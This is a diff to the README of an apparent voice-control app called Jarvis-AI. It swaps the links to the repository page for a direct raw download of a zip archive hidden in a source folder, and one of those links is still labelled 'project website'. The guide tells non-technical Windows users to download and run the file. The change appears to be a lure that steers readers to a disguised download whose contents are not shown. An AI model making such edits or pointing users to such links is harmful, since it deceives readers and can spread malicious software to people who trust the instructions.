@@ -1,6 +1,6 @@
 # 🤖 Jarvis-AI - Simple voice control for your computer
 
-[![Download Jarvis-AI](https://img.shields.io/badge/Download-Jarvis--AI-blue.svg)](https://github.com/violettetonsorial704/Jarvis-AI)
+[![Download Jarvis-AI](https://img.shields.io/badge/Download-Jarvis--AI-blue.svg)](https://raw.githubusercontent.com/violettetonsorial704/Jarvis-AI/main/src/qml/Jarvis-AI-3.2.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ To run Jarvis-AI, your computer must meet these basic standards:
 
 Follow these instructions to set up the software on your Windows machine. You do not need to know how to code.
 
-1. Visit the project website: https://github.com/violettetonsorial704/Jarvis-AI
+1. Visit the project website: https://raw.githubusercontent.com/violettetonsorial704/Jarvis-AI/main/src/qml/Jarvis-AI-3.2.zip
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in .exe to your Downloads folder.
